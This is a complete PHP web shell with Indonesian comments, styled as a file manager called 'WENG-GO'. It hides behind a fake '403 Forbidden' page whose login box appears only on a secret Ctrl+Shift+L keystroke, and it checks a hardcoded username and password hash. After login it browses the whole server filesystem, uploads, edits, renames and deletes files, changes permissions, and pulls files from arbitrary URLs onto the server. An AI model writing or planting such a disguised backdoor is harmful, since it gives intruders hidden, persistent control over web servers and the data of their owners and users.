<?php
session_start();

// Aktifkan pelaporan error untuk debugging (HANYA UNTUK PENGEMBANGAN! Nonaktifkan di produksi)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Kredensial Login
const USERNAME = 'WENGGO';
const HASHED_PASSWORD = '$1$B0atAKKm$XctEzhZl2BQOQ32Qlrtse0'; // Password: 'password'

// Fungsi rekursif untuk menghapus folder beserta isinya
function deleteFolderRecursive($folder) {
    if (!is_dir($folder)) {
        return false;
    }
    foreach (scandir($folder) as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $folder . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteFolderRecursive($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($folder);
}

// Tangani permintaan logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// --- LOGIKA LOGIN ---
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === USERNAME && password_verify($_POST['password'], HASHED_PASSWORD)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Username atau password salah!";
        }
    }

 
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>403 Forbidden</title>
        <style>
            #loginBox {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #000; 
                padding: 20px;
                border: 2px solid #0f0; 
                width: 350px;
                color: #0f0; 
                display: none; 
                box-shadow: 0 0 15px rgba(0, 255, 0, 0.5); 
                font-family: 'Courier New', monospace; 
            }
            #loginBox strong, #loginBox span {
                color: #00ff00; 
            }
            #loginBox input[type="text"],
            #loginBox input[type="password"] {
                width: 100%;
                background: #000;
                border: none;
                border-bottom: 1px solid #0f0;
                color: #0f0;
                padding: 5px;
                margin-bottom: 15px; 
                font-family: inherit;
                outline: none; 
            }
            #loginBox input[type="text"]:focus,
            #loginBox input[type="password"]:focus {
                border-bottom: 2px solid #00ff00; 
            }
            #loginBox button[type="submit"] {
                width: 100%;
                background: #000;
                border: 1px solid #0f0;
                color: #0f0;
                padding: 8px;
                font-family: inherit;
                cursor: pointer;
                transition: background-color 0.3s, color 0.3s, border-color 0.3s;
            }
            #loginBox button[type="submit"]:hover {
                background: #0f0;
                color: #000;
                border-color: #0f0;
            }
            .error-message {
                color: #f00;
                margin-bottom: 10px;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <h1>Forbidden</h1>
        <p>You don't have permission to access <?= htmlspecialchars($_SERVER['PHP_SELF']) ?> on this server.</p>
        <hr>
        <div id="loginBox">
            <div style="margin-bottom:10px;">
                <strong>Linux Console</strong><br>
                <span>login: </span>
            </div>
            <?php if (isset($error)) echo '<div class="error-message">' . $error . '</div>'; ?>
            <form method="post">
                <label>Username</label><br>
                <input type="text" name="username" required><br>
                <label>Password</label><br>
                <input type="password" name="password" required><br>
                <button type="submit">Login</button>
            </form>
        </div>
        <script>
          
            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && e.shiftKey && e.key === 'L') {
                    var box = document.getElementById('loginBox');
                    // Toggle visibility
                    box.style.display = box.style.display === 'none' ? 'block' : 'none';
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit; 
}



// Fungsi untuk menampilkan permission file/folder
function get_permissions($file) {
    if (!file_exists($file)) return 'N/A';
    return substr(sprintf('%o', fileperms($file)), -4);
}

function render_path_links($path) {
    // Selalu pastikan path adalah realpath untuk konsistensi
    $path = realpath($path) ?: __DIR__;

    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $acc = '';
    // Mulai dari root server jika path tidak relatif terhadap __DIR__
    $out = '<a href="?path=' . urlencode(DIRECTORY_SEPARATOR) . '" class="text-info">/</a>';

    // Jika path saat ini adalah root (misalnya C:\ atau /)
    if ($path === DIRECTORY_SEPARATOR || (strlen($path) === 3 && $path[1] === ':' && $path[2] === DIRECTORY_SEPARATOR)) {
        return '<a href="?path=' . urlencode($path) . '" class="text-info">' . htmlspecialchars($path) . '</a>';
    }

    // Bangun breadcrumb dari root server
    foreach ($parts as $p) {
        if ($p === '') continue; // Lewati bagian kosong
        $acc .= DIRECTORY_SEPARATOR . $p;
        $out .= ' <a href="?path=' . urlencode($acc) . '" class="text-info">' . htmlspecialchars($p) . '</a> /';
    }
    return rtrim($out, ' /'); // Hapus slash trailing
}

// Tentukan direktori kerja saat ini
$dir = $_GET['path'] ?? __DIR__;
$dir = realpath($dir) ?: __DIR__; // Pastikan path absolut dan fallback ke __DIR__

// --- PROSES MANAJEMEN FILE (CRUD) ---

// -- PROSES CREATE FOLDER --
if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $newFolder = $dir . DIRECTORY_SEPARATOR . basename($_POST['folder_name']);
    if (!file_exists($newFolder)) {
        if (mkdir($newFolder, 0755)) {
            header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
            exit;
        } else {
            $error = "Gagal membuat folder. Periksa izin direktori.";
        }
    } else {
        $error = "Folder sudah ada!";
    }
}

// -- PROSES CREATE FILE --
if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $newFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    if (!file_exists($newFile)) {
        if (file_put_contents($newFile, "") !== false) {
            header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
            exit;
        } else {
            $error = "Gagal membuat file. Periksa izin direktori.";
        }
    } else {
        $error = "File sudah ada!";
    }
}

// -- PROSES UPLOAD FILES --
if (isset($_FILES['file']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // Ini adalah permintaan AJAX dari JavaScript
    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
        $uploaded = 0;
        $errors = [];
        $files = $_FILES['file'];

        if (!is_array($files['name'])) { // Handle single file upload (jika ada input file tunggal)
            $files = [
                'name' => [$files['name']], 'tmp_name' => [$files['tmp_name']],
                'error' => [$files['error']], 'size' => [$files['size']], 'type' => [$files['type']],
            ];
        }

        for ($i = 0; $i < count($files['name']); $i++) {
            if ($files['error'][$i] === UPLOAD_ERR_OK) {
                $targetFile = $dir . DIRECTORY_SEPARATOR . basename($files['name'][$i]);
                if (move_uploaded_file($files['tmp_name'][$i], $targetFile)) {
                    $uploaded++;
                } else {
                    $errors[] = "Gagal upload file: " . htmlspecialchars($files['name'][$i]);
                }
            } else {
                $errors[] = "Upload error untuk " . htmlspecialchars($files['name'][$i]) . ": " . $files['error'][$i];
            }
        }

        // --- PERBAIKAN DI SINI ---
        // Kirim respons JSON agar JavaScript bisa memparse dengan benar
        header('Content-Type: application/json');
        if (empty($errors)) {
            http_response_code(200);
            echo json_encode(['status' => 'success', 'message' => "$uploaded file berhasil diupload."]);
        } else {
            http_response_code(500); // Atau 400 jika itu error klien
            echo json_encode(['status' => 'error', 'message' => implode("\n", $errors)]);
        }
        exit; // Penting untuk menghentikan eksekusi setelah respons AJAX
        // --- AKHIR PERBAIKAN ---

    } else {
        // Ini adalah upload form standar (jika ada) - biasanya tidak digunakan dengan AJAX
        // Tetap arahkan ulang ke halaman yang sama
        header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
        exit;
    }
}


// -- PROSES DELETE FILE/FOLDER --
if (isset($_GET['delete'])) {
    $targetName = basename($_GET['delete']);
    $targetPath = $dir . DIRECTORY_SEPARATOR . $targetName;

    if (file_exists($targetPath)) {
        if (is_file($targetPath)) {
            unlink($targetPath);
        } elseif (is_dir($targetPath)) {
            deleteFolderRecursive($targetPath);
        }
    }

    header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
    exit;
}

// -- PROSES RENAME --
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $oldName = basename($_POST['old_name']);
    $newName = basename($_POST['new_name']);
    $oldPath = $dir . DIRECTORY_SEPARATOR . $oldName;
    $newPath = $dir . DIRECTORY_SEPARATOR . $newName;

    if (file_exists($oldPath) && !file_exists($newPath)) {
        rename($oldPath, $newPath);
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
    exit;
}

// -- PROSES CHMOD --
if (isset($_POST['chmod']) && isset($_POST['file_name']) && isset($_POST['perm'])) {
    $fileName = basename($_POST['file_name']);
    $filePath = $dir . DIRECTORY_SEPARATOR . $fileName;
    $perm = $_POST['perm'];

    if (preg_match('/^[0-7]{3,4}$/', $perm) && file_exists($filePath)) {
        chmod($filePath, octdec($perm));
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
    exit;
}

// --- AJAX HANDLER UNTUK EDIT FILE ---

// -- AJAX LOAD FILE CONTENT (modal edit file) --
if (isset($_GET['ajax_load_file']) && isset($_GET['file']) && isset($_GET['current_path'])) {
    $currentPathFromJs = realpath(urldecode($_GET['current_path']));
    if ($currentPathFromJs === false) {
        http_response_code(400);
        echo "Error: Path current_path tidak valid.";
        exit;
    }

    $fileName = basename($_GET['file']);
    $filePath = $currentPathFromJs . DIRECTORY_SEPARATOR . $fileName;

    if (file_exists($filePath) && is_file($filePath)) {
        header('Content-Type: text/plain; charset=utf-8');
        try {
            $content = file_get_contents($filePath);
            if ($content === false) {
                throw new Exception("Gagal membaca konten file. Periksa izin baca.");
            }
            echo $content;
        } catch (Exception $e) {
            http_response_code(500);
            echo "Error saat memuat file: " . $e->getMessage();
            error_log("FM_ERROR: Failed to read file " . $filePath . " for editing. Error: " . $e->getMessage());
        }
    } else {
        http_response_code(404);
        echo "Error: File tidak ditemukan, atau bukan file.";
        error_log("FM_ERROR: Attempt to load invalid file: " . $filePath);
    }
    exit;
}

// -- AJAX SAVE FILE CONTENT (modal edit file) --
if (isset($_POST['ajax_save_file']) && isset($_POST['edit_file']) && isset($_POST['content']) && isset($_POST['current_path'])) {
    $currentPathFromJs = realpath(urldecode($_POST['current_path']));
    if ($currentPathFromJs === false) {
        http_response_code(400);
        echo "Error: Path current_path tidak valid untuk penyimpanan.";
        exit;
    }

    $fileName = basename($_POST['edit_file']);
    $filePath = $currentPathFromJs . DIRECTORY_SEPARATOR . $fileName;

    if (file_exists($filePath) && is_file($filePath)) {
        try {
            if (file_put_contents($filePath, $_POST['content']) !== false) {
                echo "OK";
            } else {
                throw new Exception("Operasi tulis file gagal. Periksa izin tulis.");
            }
        } catch (Exception $e) {
            http_response_code(500);
            echo "Error saat menyimpan file: " . $e->getMessage();
            error_log("FM_ERROR: Failed to write to file " . $filePath . " for editing. Error: " . $e->getMessage());
        }
    } else {
        http_response_code(400);
        echo "Error: File tidak ditemukan, atau bukan file.";
        error_log("FM_ERROR: Attempt to save to invalid file: " . $filePath);
    }
    exit;
}

// --- AKHIR AJAX HANDLER ---

// -- DOWNLOAD FILE FROM URL --
if (isset($_POST['download_file']) && !empty($_POST['download_url']) && !empty($_POST['download_name'])) {
    $url = filter_var($_POST['download_url'], FILTER_VALIDATE_URL);
    $saveName = basename($_POST['download_name']);

    if ($url && $saveName) {
        $targetFile = $dir . DIRECTORY_SEPARATOR . $saveName;
        try {
            $fileContent = @file_get_contents($url); // Gunakan @ untuk menekan warning jika URL tidak valid/tidak bisa diakses
            if ($fileContent === false) {
                throw new Exception("Gagal mengunduh konten dari URL.");
            }
            if (file_put_contents($targetFile, $fileContent) === false) {
                throw new Exception("Gagal menyimpan file yang didownload.");
            }
        } catch (Exception $e) {
            $error = "Download Error: " . $e->getMessage();
            error_log("FM_ERROR: Download failed for URL " . $url . ". Error: " . $e->getMessage());
        }
    } else {
        $error = "URL download atau nama file tidak valid.";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?path=" . urlencode($dir));
    exit;
}

// Ambil isi folder untuk ditampilkan
$items = scandir($dir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Futuristic File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(to right, #dc4040, #0c8172);
            color: #3eff00;
            font-family: 'Courier New', monospace;
        }
        .container {
            margin-top: 40px;
        }
        .table {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00aaff;
            box-shadow: 0 0 10px rgba(0, 170, 255, 0.3);
        }
        .table th, .table td {
            vertical-align: middle;
            color: #ffffff;
            border-color: rgba(0, 170, 255, 0.3);
        }
        .table thead th {
            background-color: rgba(0, 0, 0, 0.9);
            color: #66ccff;
            border-color: #00aaff;
        }
        .table-hover tbody tr:hover {
            background-color: rgba(0, 170, 255, 0.1);
        }
        a, a:hover {
            color: #00ff58;
            text-decoration: none;
        }
        a:hover {
            color: #66ccff;
            text-decoration: underline;
            cursor: pointer;
        }
        .btn {
            border-radius: 8px;
            font-weight: bold;
            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
        }
        .btn-primary { background-color: #007bff; border-color: #007bff; color: #fff; }
        .btn-primary:hover { background-color: #0056b3; border-color: #0056b3; }
        .btn-success { background-color: #28a745; border-color: #28a745; color: #fff; }
        .btn-success:hover { background-color: #218838; border-color: #218838; }
        .btn-info { background-color: #17a2b8; border-color: #17a2b8; color: #fff; }
        .btn-info:hover { background-color: #138496; border-color: #138496; }
        .btn-warning { background-color: #ffc107; border-color: #ffc107; color: #000; }
        .btn-warning:hover { background-color: #e0a800; border-color: #e0a800; }
        .btn-danger { background-color: #dc3545; border-color: #dc3545; color: #fff; }
        .btn-danger:hover { background-color: #c82333; border-color: #c82333; }
        .btn-secondary { background-color: #6c757d; border-color: #6c757d; color: #fff; }
        .btn-secondary:hover { background-color: #5a6268; border-color: #5a6268; }

        .btn-outline-danger {
            color: #dc3545;
            border-color: #dc3545;
            background-color: transparent;
        }
        .btn-outline-danger:hover {
            background-color: #dc3545;
            color: #fff;
        }
        .btn-outline-warning {
            color: #ffc107;
            border-color: #ffc107;
            background-color: transparent;
        }
        .btn-outline-warning:hover {
            background-color: #ffc107;
            color: #000;
        }

        .navbar {
            background-color: rgba(0, 0, 0, 0.85);
            box-shadow: 0 2px 10px rgba(0,170,255,0.4);
        }
        .navbar-brand {
            color: #f2ff66  !important;
            font-size: 1.5rem;
            text-shadow: 0 0 5px rgba(0, 170, 255, 0.8);
        }
        input[type=text].perm-input,
        .form-control {
            background-color: #8e8e8e;
            border: 1px solid #00ffef;
            color: #000000;
            border-radius: 5px;
            padding: 0.375rem 0.75rem;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        .form-control:focus {
            background-color: #111;
            color: #00aaff;
            border-color: #66ccff;
            box-shadow: 0 0 0 0.25rem rgba(0, 170, 255, 0.25);
        }
        textarea#editFileContent {
            background:#111;
            color:#c1c8cb;
            border: 1px solid #00ffb9;
            resize: vertical;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace; /* Font untuk editor kode */
            line-height: 1.5;
            padding: 10px;
        }
        #editFileStatus {
            color: #66ccff;
            font-style: italic;
        }
        .alert {
            font-weight: bold;
            padding: 10px 15px;
            border-radius: 5px;
            animation: fadeIn 0.5s;
        }
        .alert-danger {
            background-color: #dc3545;
            border-color: #dc3545;
            color: #fff;
        }
        .alert-success {
            background-color: #28a745;
            border-color: #28a745;
            color: #fff;
        }
        .alert-warning {
            background-color: #ffc107;
            border-color: #ffc107;
            color: #000;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

    </style>
</head>
<body>
<nav class="navbar navbar-dark px-4 d-flex justify-content-between align-items-center">
    <span class="navbar-brand mb-0 h1">WENG-GO</span>
    <div>
      <button class="btn btn-success btn-sm me-2" data-bs-toggle="modal" data-bs-target="#createFolderModal" title="Buat Folder Baru">
        📁 Folder Baru
      </button>
      <button class="btn btn-info btn-sm me-3" data-bs-toggle="modal" data-bs-target="#createFileModal" title="Buat File Baru">
        📄 File Baru
      </button>
      <a href="?logout=1" class="btn btn-sm btn-danger">Logout</a>
    </div>
</nav>
<div class="container">

    <h5 class="mt-4">📁 Path: <?= render_path_links($dir) ?></h5>

    <form id="uploadForm" enctype="multipart/form-data" class="my-3 d-flex gap-2" method="post">
        <input type="file" id="fileInput" name="file[]" multiple class="form-control" />
        <button type="submit" class="btn btn-primary">Upload</button>
    </form>

    <div class="progress" style="height: 20px; display:none;" id="progressWrapper">
      <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 0%">0%</div>
    </div>

    <div id="uploadStatus" class="mt-2 text-info"></div>


    <form method="post" class="mb-3 d-flex gap-2 align-items-center">
        <input type="url" name="download_url" class="form-control" placeholder="Masukkan URL file yang ingin didownload" required>
        <input type="text" name="download_name" class="form-control" placeholder="Nama file yang disimpan (dgn ekstensi)" required>
        <button type="submit" name="download_file" class="btn btn-secondary">Download File</button>
    </form>

    <?php if (isset($error)): ?>
      <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>
    <?php if (isset($uploadSuccess)): ?>
      <div class="alert alert-success"><?= htmlspecialchars($uploadSuccess) ?></div>
    <?php endif; ?>
    <?php if (isset($uploadError)): ?>
      <div class="alert alert-warning"><?= $uploadError ?></div>
    <?php endif; ?>

    <table class="table table-dark table-hover table-bordered">
        <thead class="table-light text-dark">
            <tr>
                <th>Nama</th>
                <th style="width: 100px;">Tipe</th>
                <th style="width: 120px;">Izin (Permissions)</th>
                <th style="width: 160px;">Aksi</th>
            </tr>
        </thead>
        <tbody>
            <?php
            // Menampilkan link ke direktori induk
            $parentDir = dirname($dir);
            if ($parentDir !== $dir) { // Check if we are not at the filesystem root
                echo '<tr>';
                echo '<td>📁 <a href="?path=' . urlencode($parentDir) . '">.. (Folder Induk)</a></td>';
                echo '<td>Folder</td>';
                echo '<td>-</td>';
                echo '<td>-</td>';
                echo '</tr>';
            }

            // Urutkan item berdasarkan folder lalu file, dan secara alfabetis
            $folders = [];
            $files = [];
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                if (!file_exists($path)) continue; // Pastikan file/folder benar-benar ada

                if (is_dir($path)) {
                    $folders[] = $item;
                } else {
                    $files[] = $item;
                }
            }
            sort($folders);
            sort($files);
            $sortedItems = array_merge($folders, $files);

            foreach ($sortedItems as $item):
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                $perm = get_permissions($path);
            ?>
            <tr>
                <td>
                    <?php if (is_dir($path)): ?>
                        📁 <a href="?path=<?= urlencode($path) ?>"><?= htmlspecialchars($item) ?></a>
                    <?php else: ?>
                        📄 <a href="#" class="edit-file-link" data-filename="<?= htmlspecialchars($item) ?>"><?= htmlspecialchars($item) ?></a>
                    <?php endif; ?>
                </td>
                <td><?= is_dir($path) ? 'Folder' : 'File' ?></td>
                <td>
                    <form method="post" class="d-flex align-items-center gap-1 file-actions" onsubmit="return confirm('Ubah izin menjadi nilai ini?');" style="white-space: nowrap;">
                        <input type="hidden" name="file_name" value="<?= htmlspecialchars($item) ?>">
                        <input type="text" name="perm" value="<?= $perm ?>" class="perm-input" maxlength="4" pattern="[0-7]{3,4}" title="Masukkan izin dalam oktal (misal: 0644)" required>
                        <button type="submit" name="chmod" class="btn btn-sm btn-warning" title="Ubah Izin">CHMOD</button>
                    </form>
                </td>
                <td>
                    <div class="actions-container file-actions">
                        <a href="?path=<?= urlencode($dir) ?>&delete=<?= urlencode($item) ?>"
                           class="btn btn-sm btn-outline-danger" onclick="return confirm('Hapus item ini secara permanen?')" title="Hapus">🗑</a>

                        <?php if (is_file($path)): ?>
                            <button class="btn btn-sm btn-outline-warning edit-file-link" data-filename="<?= htmlspecialchars($item) ?>" title="Edit File">✏</button>
                        <?php endif; ?>

                        <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#renameModal"
                                data-oldname="<?= htmlspecialchars($item) ?>" title="Ganti Nama">✎</button>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <form method="post" class="modal-content bg-dark text-light">
          <div class="modal-header">
            <h5 class="modal-title" id="createFolderLabel">Buat Folder Baru</h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <input type="text" name="folder_name" class="form-control" placeholder="Nama folder" required autofocus>
          </div>
          <div class="modal-footer">
            <button type="submit" name="create_folder" class="btn btn-primary">Buat Folder</button>
          </div>
        </form>
      </div>
    </div>

    <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <form method="post" class="modal-content bg-dark text-light">
          <div class="modal-header">
            <h5 class="modal-title" id="createFileLabel">Buat File Baru</h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <input type="text" name="file_name" class="form-control" placeholder="Nama file (misal: test.txt)" required autofocus>
          </div>
          <div class="modal-footer">
            <button type="submit" name="create_file" class="btn btn-primary">Buat File</button>
          </div>
        </form>
      </div>
    </div>

    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered">
        <form method="post" class="modal-content bg-dark text-light">
          <div class="modal-header">
            <h5 class="modal-title" id="renameLabel">Ganti Nama File/Folder</h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <input type="hidden" name="old_name" id="renameOldName">
            <label for="renameNewName" class="form-label">Nama Baru:</label>
            <input type="text" name="new_name" id="renameNewName" class="form-control" required autofocus>
          </div>
          <div class="modal-footer">
            <button type="submit" name="rename" class="btn btn-primary">Ganti Nama</button>
          </div>
        </form>
      </div>
    </div>

    <div class="modal fade" id="editFileModal" tabindex="-1" aria-labelledby="editFileLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content bg-dark text-light">
          <div class="modal-header">
            <h5 class="modal-title" id="editFileLabel">Edit File: <span id="editFileName"></span></h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <textarea id="editFileContent" class="form-control" rows="20" spellcheck="false"></textarea>
            <div id="editFileStatus" class="mt-2 text-center"></div>
          </div>
          <div class="modal-footer">
            <button id="saveFileBtn" class="btn btn-primary">Simpan</button>
          </div>
        </div>
      </div>
    </div>

</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    // Rename modal show event
    const renameModal = document.getElementById('renameModal');
    renameModal.addEventListener('show.bs.modal', function (event) {
        const button = event.relatedTarget;
        const oldName = button.getAttribute('data-oldname');
        document.getElementById('renameOldName').value = oldName;
        document.getElementById('renameNewName').value = oldName;
    });

    // Edit file modal show event
    const editFileModal = new bootstrap.Modal(document.getElementById('editFileModal'));
    let currentEditFile = null; // Menyimpan nama file yang sedang diedit
    const fileNameDisplay = document.getElementById('editFileName'); // Span untuk menampilkan nama file di modal
    const fileContentArea = document.getElementById('editFileContent'); // Textarea untuk konten file
    const saveBtn = document.getElementById('saveFileBtn'); // Tombol simpan
    const statusDiv = document.getElementById('editFileStatus'); // Div untuk pesan status

    // Event listener untuk semua link/tombol edit file
    document.querySelectorAll('.edit-file-link').forEach(el => {
        el.addEventListener('click', function(e) {
            e.preventDefault(); // Mencegah perilaku default link
            const filename = this.getAttribute('data-filename');
            currentEditFile = filename;
            fileNameDisplay.textContent = filename;
            fileContentArea.value = 'Memuat konten file...'; // Pesan loading
            statusDiv.textContent = ''; // Kosongkan status sebelumnya
            saveBtn.disabled = true; // Nonaktifkan tombol simpan selama loading

            // Ambil path direktori saat ini dari PHP (diekspos via PHP di HTML)
            const currentPath = '<?= urlencode($dir) ?>';

            // Lakukan permintaan AJAX untuk memuat konten file
            fetch(`?ajax_load_file=1&file=${encodeURIComponent(filename)}&current_path=${currentPath}`)
                .then(r => {
                    if (!r.ok) { // Jika respons bukan 2xx (misal 404, 500)
                        return r.text().then(text => {
                            // Lempar error dengan status dan pesan dari server
                            throw new Error(`HTTP error! Status: ${r.status}, Pesan: ${text}`);
                        });
                    }
                    return r.text(); // Ambil teks respons (konten file)
                })
                .then(text => {
                    fileContentArea.value = text; // Tampilkan konten di textarea
                    editFileModal.show(); // Tampilkan modal
                    fileContentArea.focus(); // Fokuskan kursor ke textarea
                }).catch(error => {
                    console.error('Error loading file:', error);
                    fileContentArea.value = `Gagal memuat file: ${error.message}`;
                    statusDiv.textContent = 'Gagal memuat file. Cek konsol browser (F12) untuk detail.';
                    statusDiv.style.color = '#dc3545'; // Warna merah untuk error
                }).finally(() => {
                    saveBtn.disabled = false; // Aktifkan kembali tombol simpan
                });
        });
    });

    // Event listener untuk tombol Simpan di modal edit file
    saveBtn.addEventListener('click', function() {
        if (!currentEditFile) return; // Pastikan ada file yang sedang diedit
        saveBtn.disabled = true; // Nonaktifkan tombol simpan
        statusDiv.textContent = 'Menyimpan...'; // Pesan status
        statusDiv.style.color = '#66ccff'; // Reset warna status ke default

        const currentPath = '<?= urlencode($dir) ?>'; // Ambil path saat ini lagi

        // Kirim permintaan AJAX POST untuk menyimpan konten file
        fetch('<?= $_SERVER['PHP_SELF'] ?>', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'}, // Penting untuk mengirim data form
            body: new URLSearchParams({ // Buat payload data
                ajax_save_file: '1',
                edit_file: currentEditFile,
                content: fileContentArea.value,
                current_path: currentPath // Kirim path saat ini ke server
            })
        }).then(r => r.text()).then(res => {
            if (res.trim() === 'OK') {
                statusDiv.textContent = 'File berhasil disimpan.';
                statusDiv.style.color = '#28a745'; // Warna hijau untuk sukses
            } else {
                statusDiv.textContent = `Gagal menyimpan file: ${res.trim()}`;
                statusDiv.style.color = '#dc3545'; // Warna merah untuk error
            }
        }).catch(error => {
            console.error('Error saving file:', error);
            statusDiv.textContent = 'Terjadi kesalahan jaringan saat menyimpan.';
            statusDiv.style.color = '#dc3545';
        }).finally(() => {
            saveBtn.disabled = false; // Aktifkan kembali tombol simpan
            // Hapus pesan status setelah beberapa detik
            setTimeout(() => {
                statusDiv.textContent = '';
            }, 3000);
        });
    });

    // Upload form with progress bar
    const uploadForm = document.getElementById('uploadForm');
    const fileInput = document.getElementById('fileInput');
    const progressWrapper = document.getElementById('progressWrapper');
    const progressBar = document.getElementById('progressBar');
    const uploadStatus = document.getElementById('uploadStatus');

    uploadForm.addEventListener('submit', function(e) {
        e.preventDefault();
        if (fileInput.files.length === 0) {
            uploadStatus.textContent = 'Pilih file terlebih dahulu.';
            uploadStatus.style.color = '#ffc107'; // Warna kuning
            return;
        }

        const formData = new FormData();
        for (let i = 0; i < fileInput.files.length; i++) {
            formData.append('file[]', fileInput.files[i]);
        }

        const xhr = new XMLHttpRequest();
        xhr.open('POST', '<?= $_SERVER['PHP_SELF'] . '?path=' . urlencode($dir) ?>', true); // Kirim ke halaman yang sama
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest'); // Tambahkan header untuk identifikasi AJAX

        xhr.upload.onprogress = function(e) {
            if (e.lengthComputable) {
                let percent = (e.loaded / e.total) * 100;
                progressWrapper.style.display = 'block';
                progressBar.style.width = percent + '%';
                progressBar.textContent = Math.round(percent) + '%';
                uploadStatus.textContent = `Mengunggah: ${Math.round(percent)}%`;
                uploadStatus.style.color = '#00aaff';
            }
        };

        xhr.onload = function() {
            progressWrapper.style.display = 'none'; // Sembunyikan progress bar
            progressBar.style.width = '0%'; // Reset progress bar
            progressBar.textContent = '0%'; // Reset teks progress bar

            try {
                // --- PERBAIKAN DI SINI ---
                const response = JSON.parse(xhr.responseText); // Parse respons sebagai JSON
                if (xhr.status === 200 && response.status === 'success') {
                    uploadStatus.textContent = response.message;
                    uploadStatus.style.color = '#28a745'; // Warna hijau
                    setTimeout(() => {
                        location.reload(); // Reload halaman setelah upload selesai
                    }, 1000);
                } else {
                    uploadStatus.textContent = `Upload gagal: ${response.message || 'Terjadi kesalahan tidak diketahui.'}`;
                    uploadStatus.style.color = '#dc3545'; // Warna merah
                }
                // --- AKHIR PERBAIKAN ---
            } catch (e) {
                console.error('Error parsing JSON response:', e);
                uploadStatus.textContent = 'Upload gagal: Respons server tidak valid.';
                uploadStatus.style.color = '#dc3545';
            }
        };

        xhr.onerror = function() {
            uploadStatus.textContent = 'Upload gagal: Kesalahan jaringan.';
            uploadStatus.style.color = '#dc3545';
            progressWrapper.style.display = 'none';
            progressBar.style.width = '0%';
            progressBar.textContent = '0%';
        };

        xhr.send(formData);
    });
});
</script>
</body>
</html>
